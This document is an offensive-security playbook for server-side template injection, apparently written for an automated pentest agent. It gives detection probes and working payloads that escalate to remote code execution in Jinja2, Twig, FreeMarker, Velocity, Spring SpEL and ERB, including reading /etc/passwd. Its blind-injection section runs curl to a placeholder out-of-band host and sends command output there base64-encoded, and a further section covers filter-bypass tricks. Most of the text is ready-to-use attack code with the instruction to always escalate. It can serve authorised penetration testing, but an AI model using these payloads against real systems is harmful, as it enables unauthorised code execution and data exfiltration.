# Server-Side Template Injection (SSTI)

> SSTI -> RCE on most engines. Don't stop at math evaluation; always escalate.

---

## Phase 1: Detection

### 1.1 Polyglot probe (sends in ONE shot to fingerprint engine)
```
${{<%[%'"}}%\
```
Engines explode differently:
- Twig:        unexpected character `%` near `<%`
- Jinja2:      `TemplateSyntaxError`
- ERB:         `syntax error`
- FreeMarker:  `Encountered "<%"...`
- Velocity:    `org.apache.velocity.runtime.parser.ParseException`

### 1.2 Math evaluation per syntax
Send each ONE AT A TIME, inspect for the literal `49` or `7777777`:

| Syntax | Engine candidate |
|--------|-------------------|
| `{{7*7}}`     | Jinja2, Twig, Nunjucks, Liquid |
| `{{7*'7'}}`   | Jinja2 -> `7777777`. Twig -> `49`. Distinguishes them. |
| `${7*7}`      | FreeMarker, JSP-EL, Spring SpEL, Thymeleaf |
| `<%= 7*7 %>`  | ERB (Ruby), JSP, ASP |
| `#{7*7}`      | Pug, Ruby, Razor (`@(7*7)`) |
| `*{7*7}`      | Thymeleaf |
| `{7*7}`       | Smarty |

### 1.3 Where to inject
- Email/name fields rendered in welcome emails (often Jinja2/Liquid)
- Markdown -> HTML pipelines with template post-processing
- Error pages echoing your input
- Webhooks that template the body
- Print/PDF/report generators

---

## Phase 2: Engine-Specific Escalation to RCE

### 2.1 Jinja2 (Python)
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]("id", shell=True, stdout=-1).communicate() }}
{{ config.__class__.from_object('os').popen('id').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 2.2 Twig (PHP)
```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
{{ ['cat /etc/passwd']|map('passthru') }}
```

### 2.3 FreeMarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"]).start()}
```

### 2.4 Velocity (Java)
```
#set($e="exp")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### 2.5 Spring SpEL
```
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream(),T(java.nio.charset.Charset).forName("UTF-8"))}
```

### 2.6 ERB (Ruby)
```
<%= `id` %>
<%= IO.popen('id').read() %>
<%= system('id') %>
```

---

## Phase 3: Blind SSTI (use OOB)

Many template injections are blind — output isn't reflected. Plant an OOB
callback in the payload:

```
{{ "".__class__.__mro__[1].__subclasses__()[40]("/tmp/x", "w").write(__import__("os").popen("curl http://<oob>/$(id)").read()) }}
```

For shell-eval engines, simpler:
```
${T(java.lang.Runtime).getRuntime().exec("curl http://<oob>/x")}
<%= `curl http://<oob>/$(id|base64 -w0)` %>
```

Then `oob_poll(token=...)` to confirm — and any base64-encoded path tells
you what it ran.

---

## Phase 4: Filter Bypasses
- Bracket access vs. dotted: `['__class__']` instead of `.__class__`
- String concat to obfuscate: `('__cl'+'ass__')`
- Attribute via `attr()`: `{{ ''|attr('__class__') }}`
- Newline injection: `\n{{...}}`
- Sandbox escape via `cycler`, `joiner`, `namespace` (Jinja2)

---

## Verification rules
- If you only got math evaluation, the report is "info: SSTI candidate".
- If you got a process command output, that's a confirmed VERIFIED finding.
- Always pair with OOB if execution is non-reflected.
